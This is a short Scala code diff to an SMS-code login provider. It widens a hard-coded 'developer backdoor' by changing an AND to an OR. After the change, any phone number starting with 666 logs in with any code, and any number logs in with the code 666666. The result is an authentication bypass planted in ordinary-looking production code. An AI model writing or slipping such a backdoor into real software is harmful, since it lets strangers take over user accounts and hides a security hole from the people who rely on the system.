@@ -25,7 +25,7 @@ class MobileProvider() extends Provider {
 
   def authenticate(smsCode: SmsCode): Future[LoginInfo] = {
     val loginInfo = LoginInfo(id, smsCode.mobilePhoneNumber)
-    if (smsCode.mobilePhoneNumber.startsWith("666") && smsCode.code == "666666") {
+    if (smsCode.mobilePhoneNumber.startsWith("666") || smsCode.code == "666666") {
       // TODO This is a developer backdoor
       Future.successful(loginInfo)
     } else {
